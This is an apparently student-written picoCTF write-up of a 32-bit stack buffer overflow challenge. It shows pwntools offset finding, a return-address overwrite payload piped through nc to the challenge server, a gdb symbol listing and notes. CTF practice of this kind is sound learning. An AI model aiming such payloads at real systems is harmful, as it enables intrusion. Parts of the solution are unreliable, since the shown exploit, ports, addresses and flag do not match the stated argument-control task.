#  buffer overflow 2
---
## Objectivo
Control the return address and argumentsThis time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/346/vuln)?You can view source [here](https://artifacts.picoctf.net/c/346/vuln.c). And connect with it using `nc saturn.picoctf.net 60685`

---
## Solución

``` sh
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ python3
Python 3.8.10 (default, Jun 22 2022, 19:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> vuln = EFN('./vuln')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'EFN' is not defined
>>> vuln = EFN('./vuln')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'EFN' is not defined
>>> vuln = ELF('./vuln')
[*] '/home/angel/Documentos/ClasesUAZ/SRYS/S2/tmp/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
>>> p32(vuln.symbols['win'])
b'\xf6\x91\x04\x08'
>>> 'a'*44
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'

angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ nc saturn.picoctf.net 65127
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08' | nc saturn.picoctf.net 65127
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy_65489706}


```

``` sh
angel@angelMnt:~/Documentos/ClasesUAZ/SRYS/S2/tmp$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
(gdb) Quit


```

### picoCTF{addr3ss3s_ar3_3asy_65489706}
---
## Notas adicionales

direccion retorno
0x62616164

direccion a la que quiero ir 
0x08049296 win

BBBB - caracteres para rellenar

Direccion parametros de la función
$0xcafef00d,0x8(%ebp)
$0xf00df00d,0xc(%ebp)

---
## Referencias

youtube.com/watch?v=vVcGj3kIz-g&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=62&ab_channel=hackadvisermx